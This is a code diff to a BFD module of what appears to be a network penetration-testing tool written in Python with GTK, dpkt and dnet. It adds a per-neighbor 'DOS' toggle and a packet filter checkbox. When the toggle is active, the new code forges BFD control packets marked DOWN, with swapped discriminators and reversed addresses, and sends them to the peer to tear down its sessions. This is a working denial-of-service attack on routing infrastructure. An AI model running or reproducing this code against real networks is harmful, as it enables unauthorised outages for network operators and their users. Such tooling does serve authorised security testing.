@@ -162,13 +162,14 @@ class mod_class(object):
     NEIGH_STATE_ROW = 2
     NEIGH_DIAG_ROW = 3
     NEIGH_ANSWER_ROW = 4
+    NEIGH_DOS_ROW = 5
     
     def __init__(self, parent, platform):
         self.parent = parent
         self.platform = platform
         self.name = "bfd"
         self.gladefile = "/modules/module_bfd.glade"
-        self.neighbor_treestore = gtk.TreeStore(str, str, str, str, bool)
+        self.neighbor_treestore = gtk.TreeStore(str, str, str, str, bool, bool)
         self.neighbors = {}
         self.filter = False
 
@@ -183,10 +184,12 @@ class mod_class(object):
             self.log("BFD: Removing lokal packet filter for BFD")
             self.fw.delete(self.bfd_filter)
             self.filter = False
+            self.filter_checkbutton.set_active(False)
 
     def get_root(self):
         self.glade_xml = gtk.glade.XML(self.parent.data_dir + self.gladefile)
-        dic = { "on_auto_answer_checkbutton_toggled" : self.on_auto_answer_checkbutton_toggled
+        dic = { "on_auto_answer_checkbutton_toggled" : self.on_auto_answer_checkbutton_toggled,
+                "on_filter_checkbutton_toggled" : self.on_filter_checkbutton_toggled
                 }
         self.glade_xml.signal_autoconnect(dic)
 
@@ -226,16 +229,37 @@ class mod_class(object):
         column.pack_start(render_toggle, expand=False)
         column.add_attribute(render_toggle, "active", self.NEIGH_ANSWER_ROW)
         self.neighbor_treeview.append_column(column)
+        column = gtk.TreeViewColumn()
+        column.set_title("DOS")
+        render_toggle = gtk.CellRendererToggle()
+        render_toggle.set_property('activatable', True)
+        render_toggle.connect('toggled', self.dos_toggle_callback, self.neighbor_treestore)
+        column.pack_start(render_toggle, expand=False)
+        column.add_attribute(render_toggle, "active", self.NEIGH_DOS_ROW)
+        self.neighbor_treeview.append_column(column)
 
         self.auto_answer_checkbutton = self.glade_xml.get_widget("auto_answer_checkbutton")
+        self.filter_checkbutton = self.glade_xml.get_widget("filter_checkbutton")
 
         return self.glade_xml.get_widget("root")
 
-    def answer_toggle_callback(self, cell, path, model):
+    def answer_toggle_callback(self, cell, path, model):            
         model[path][self.NEIGH_ANSWER_ROW] = not model[path][self.NEIGH_ANSWER_ROW]
         id = "%s:%s" % (model[path][self.NEIGH_SRC_ROW], model[path][self.NEIGH_DST_ROW])
-        (iter, discrim, answer) = self.neighbors[id]
-        self.neighbors[id] = (iter, discrim, model[path][self.NEIGH_ANSWER_ROW])
+        (iter, discrim, answer, dos) = self.neighbors[id]
+        if model[path][self.NEIGH_ANSWER_ROW] and model[path][self.NEIGH_DOS_ROW]:
+            model[path][self.NEIGH_DOS_ROW] = False
+            dos = False
+        self.neighbors[id] = (iter, discrim, model[path][self.NEIGH_ANSWER_ROW], dos)
+        
+    def dos_toggle_callback(self, cell, path, model):
+        model[path][self.NEIGH_DOS_ROW] = not model[path][self.NEIGH_DOS_ROW]
+        id = "%s:%s" % (model[path][self.NEIGH_SRC_ROW], model[path][self.NEIGH_DST_ROW])
+        (iter, discrim, answer, dos) = self.neighbors[id]
+        if model[path][self.NEIGH_DOS_ROW] and model[path][self.NEIGH_ANSWER_ROW]:
+            model[path][self.NEIGH_ANSWER_ROW] = False
+            answer = False
+        self.neighbors[id] = (iter, discrim, answer, model[path][self.NEIGH_DOS_ROW])
         
     def log(self, msg):
         self.__log(msg, self.name)
@@ -282,11 +306,12 @@ class mod_class(object):
                 self.log("BFD: Setting lokal packet filter for BFD")
                 self.fw.add(self.bfd_filter)
                 self.filter = True
+                self.filter_checkbutton.set_active(True)
             self.log("BFD: got new session: %s -> %s" % (src, dst))
-            iter = self.neighbor_treestore.append(None, [src, dst, bfd_control_packet.state_to_str[packet.state], bfd_control_packet.diag_to_str[packet.diag], self.auto_answer])
-            self.neighbors[id] = (iter, random.randint(0x1, 0x7fffffff), self.auto_answer)
+            iter = self.neighbor_treestore.append(None, [src, dst, bfd_control_packet.state_to_str[packet.state], bfd_control_packet.diag_to_str[packet.diag], self.auto_answer, False])
+            self.neighbors[id] = (iter, random.randint(0x1, 0x7fffffff), self.auto_answer, False)
         if id in self.neighbors:
-            (iter, discrim, answer) = self.neighbors[id]
+            (iter, discrim, answer, dos) = self.neighbors[id]
             self.neighbor_treestore.set_value(iter, self.NEIGH_STATE_ROW, bfd_control_packet.state_to_str[packet.state])
             self.neighbor_treestore.set_value(iter, self.NEIGH_DIAG_ROW, bfd_control_packet.diag_to_str[packet.diag])
             if answer and packet.diag == bfd_control_packet.DIAG_NO:
@@ -314,9 +339,44 @@ class mod_class(object):
                                                     data=str(ip_hdr)
                                                     )
                 self.dnet.send(str(eth_hdr))
+            elif dos and packet.state > bfd_control_packet.STATE_DOWN:
+                packet.state = bfd_control_packet.STATE_DOWN
+                tmp = packet.your_discrim
+                packet.your_discrim = packet.my_discrim
+                packet.my_discrim = tmp
+                udp_hdr = dpkt.udp.UDP( dport=udp.sport,
+                                        sport=udp.dport,
+                                        data=packet.render()
+                                        )
+                udp_hdr.ulen += len(udp_hdr.data)
+                ip_hdr = dpkt.ip.IP(    ttl=255,
+                                        tos=0xC0,
+                                        p=dpkt.ip.IP_PROTO_UDP,
+                                        src=ip.dst,
+                                        dst=ip.src,
+                                        data=str(udp_hdr)
+                                        )
+                ip_hdr.len += len(ip_hdr.data)
+                eth_hdr = dpkt.ethernet.Ethernet(   dst=eth.src,
+                                                    src=eth.dst,
+                                                    type=dpkt.ethernet.ETH_TYPE_IP,
+                                                    data=str(ip_hdr)
+                                                    )
+                self.dnet.send(str(eth_hdr))
 
     # SIGNALS #
 
     def on_auto_answer_checkbutton_toggled(self, btn):
         self.auto_answer = btn.get_active()
-        
+
+    def on_filter_checkbutton_toggled(self, btn):
+        if btn.get_active():
+            if not self.filter:
+                self.log("BFD: Setting lokal packet filter for BFD")
+                self.fw.add(self.bfd_filter)
+                self.filter = True
+        else:
+            if self.filter:
+                self.log("BFD: Removing lokal packet filter for BFD")
+                self.fw.delete(self.bfd_filter)
+                self.filter = False
